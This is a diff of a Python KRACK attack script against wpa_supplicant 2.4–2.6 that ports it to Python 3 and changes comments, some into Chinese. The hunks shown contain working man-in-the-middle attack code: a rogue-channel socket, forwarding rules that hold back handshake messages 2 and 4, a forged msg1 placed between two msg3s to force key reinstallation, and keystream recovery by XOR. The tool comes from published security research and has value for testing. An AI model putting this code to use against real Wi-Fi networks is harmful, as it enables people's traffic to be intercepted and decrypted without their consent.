@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 
 # wpa_supplicant v2.4 - v2.6 all-zero encryption key attack
 # Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
@@ -71,8 +71,9 @@ class MitmSocket(L2Socket):
 			if p[RadioTap].present & 1 != 0:
 				pos += (8 - (pos % 8))
 				pos += 8
-			# 如果要解析 MPDU 訊息，必須要把 radiotap flag 的部分，然後 & 0x10
+			# radiotap flag & 0x10
 			if ord(rawframe[pos]) & 0x10 != 0:
+				# FCS 在 frame 的最後 4 bytes
 				return Dot11(bytes(p[Dot11])[:-4])
 		return p[Dot11]
 
@@ -147,7 +148,7 @@ def dot11_get_iv(p):
 # !--
 def dot11_get_tid(p):
 	if p.haslayer(Dot11QoS):
-		return ord(str(p[Dot11QoS])[0]) & 0x0F
+		return ord(bytes(p[Dot11QoS])[0]) & 0x0F
 	return 0
 
 def dot11_is_group(p):
@@ -251,7 +252,7 @@ def print_rx(level, name, p, color=None, suffix=None):
 	if color is None and (p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas)): color="orange"
 	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)
 
-# 紀錄網路的config
+# 紀錄網路的 config
 class NetworkConfig():
 	def __init__(self):
 		self.ssid = None
@@ -392,13 +393,12 @@ class ClientState():
 		if args.group:
 			# Forwarding rules when attacking the group handshake
 			return True
-
 		else:
 			# Forwarding rules when attacking the 4-way handshake
 			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
 				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
-				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) \
-					or (p.type == 0 and p.subtype == 13)
+				# 四次交握不轉送 msg2 & msg4
+				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) or (p.type == 0 and p.subtype == 13)
 			return self.state in [ClientState.Success_Reinstalled]
 
 	def save_iv_keystream(self, iv, keystream):
@@ -523,18 +523,15 @@ class KRAckAttack():
 			client.store_msg1(p)
 		elif eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
 			client.add_if_new_msg3(p)
-			# FIXME: This may cause a timeout on the client side???
+			# FIXME: timeout on the client side
 			if len(client.msg3s) >= 2:
 				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
 				log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)
-
 				packet_list = client.msg3s
 				p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
 				packet_list.insert(1, p)
-
 				for p in packet_list: self.sock_rogue.send(p)
 				client.msg3s = []
-
 				client.attack_start()
 			else:
 				log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)
@@ -548,6 +545,8 @@ class KRAckAttack():
 
 		# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
 		plaintext = "\xaa\xaa\x03\x00\x00\x00"
+		print('Debug: ', end='') # !--
+		print(p[Dot11WEP].wepdata)
 		encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
 		keystream = xorstr(plaintext, encrypted)
 
@@ -556,14 +555,11 @@ class KRAckAttack():
 
 		# FIXME:
 		# - The reused IV could be one we accidently missed due to high traffic!!!
-		# - It could be a retransmitted packet
 		if client.is_iv_reused(iv):
 			# If the same keystream is reused, we have a normal key reinstallation attack
 			if keystream == client.get_keystream(iv):
 				log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
 				client.update_state(ClientState.Success_Reinstalled)
-
-				# TODO: Confirm that the handshake now indeed completes. FIXME: Only if we have a msg4?
 				self.sock_real.send(client.msg4)
 
 			# Otherwise the client likely installed a new key, i.e., probably an all-zero key
@@ -652,26 +648,25 @@ class KRAckAttack():
 			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
 				self.last_real_beacon = time.time()
 
-			# Decide whether we will (eventually) forward it
+			# 決定要不要轉送封包
 			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
 			might_forward = might_forward or (args.group and dot11_is_group(p) and p.haslayer(Dot11WEP))
 
 			# Pay special attention to Deauth and Disassoc frames
 			if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
 				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
-			# If targeting a specific client, display all frames it sends
+			# print 所有轉送的封包
 			elif self.clientmac is not None and self.clientmac == p.addr1:
 				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
-			# F!-- or other clients, just display what might be forwarded
-			# elif might_forward:
-			# 	print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
+			elif might_forward:
+				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
 
 			# Now perform actual actions that need to be taken, along with additional output
 			if might_forward:
 				# Unicast frames to clients
 				if p.addr1 in self.clients:
 					client = self.clients[p.addr1]
-					# Note: could be that client only switching to rogue channel before receiving Msg3 and sending Msg4
+					# Note: client 要在接收到 msg3 送出 msg4 前，切換到 rogue channel
 					if self.handle_to_client_pairwise(client, p):
 						pass
 					elif self.handle_to_client_groupkey(client, p):
